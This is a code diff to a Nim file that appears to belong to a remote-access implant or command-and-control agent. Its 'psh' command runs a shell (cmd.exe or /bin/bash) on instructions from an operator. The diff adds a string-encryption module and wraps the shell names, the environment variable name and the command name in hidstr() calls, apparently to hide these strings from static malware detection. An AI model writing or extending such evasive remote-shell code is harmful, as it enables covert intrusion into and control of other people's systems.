@@ -6,15 +6,16 @@ import std/[os, osproc, json]
 import core/types
 import core/jobs
 import commands/registry
+import crypto/strenc
 
 proc pshExecute(taskId: string, params: JsonNode, state: AgentState,
                 send: SendMsg): TaskResult =
   when defined(windows):
     let shellRaw = params{"shell"}.getStr("")
-    let shell = if shellRaw.len > 0: shellRaw else: "cmd.exe"
+    let shell = if shellRaw.len > 0: shellRaw else: hidstr("cmd.exe")
   else:
     let shellRaw = params{"shell"}.getStr("")
-    let shell = if shellRaw.len > 0: shellRaw else: getEnv("SHELL", "/bin/bash")
+    let shell = if shellRaw.len > 0: shellRaw else: getEnv(hidstr("SHELL"), hidstr("/bin/bash"))
 
   try:
     let process = startProcess(
@@ -37,4 +38,4 @@ proc pshExecute(taskId: string, params: JsonNode, state: AgentState,
     return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)
 
 proc initPsh*() =
-  register("psh", pshExecute)
+  register(hidstr("psh"), pshExecute)
